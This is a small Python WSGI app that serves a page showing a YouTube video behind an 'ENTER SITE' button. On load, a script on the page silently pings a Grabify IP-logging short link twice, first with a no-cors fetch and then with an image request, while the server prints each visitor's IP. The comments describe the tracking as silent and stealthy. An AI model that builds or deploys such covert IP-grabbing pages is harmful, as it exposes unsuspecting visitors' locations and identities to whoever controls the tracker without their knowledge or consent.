# app.py - Silently logs IP via Grabify, shows video

from datetime import datetime

# HTML page with invisible Grabify tracking
HTML = """<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: black;
            font-family: Arial;
        }
        #enter {
            font-size: 28px;
            padding: 18px 40px;
            border: 2px solid white;
            color: white;
            background: transparent;
            cursor: pointer;
            transition: 0.4s;
        }
        #enter:hover {
            background: white;
            color: black;
            transform: scale(1.1);
        }
        iframe {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            border: none;
            display: none;
        }
    </style>
</head>
<body>
    <button id="enter">ENTER SITE</button>
    <iframe id="vid" src="https://www.youtube.com/embed/2RWKJn8S9gg?autoplay=1&controls=0&rel=0" allow="autoplay; fullscreen"></iframe>
    
    <script>
        // Silently log to Grabify in background (no display)
        fetch('https://urlto.me/2l8F4', {
            method: 'GET',
            mode: 'no-cors'  // This makes it silent, no response needed
        }).catch(() => {});
        
        // Also try image ping as backup (even more stealthy)
        let img = new Image();
        img.src = 'https://urlto.me/2l8F4';
        
        document.getElementById("enter").onclick = () => {
            document.getElementById("enter").style.display = "none";
            document.getElementById("vid").style.display = "block";
        };
    </script>
</body>
</html>"""

def app(environ, start_response):
    # Optional: Also log server-side for debugging
    forwarded = environ.get('HTTP_X_FORWARDED_FOR', '')
    if forwarded:
        ip = forwarded.split(',')[0].strip()
    else:
        ip = environ.get('REMOTE_ADDR', 'unknown')
    
    print(f"Visitor IP: {ip} at {datetime.now()}")
    
    start_response('200 OK', [('Content-Type', 'text/html')])
    return [HTML.encode()]
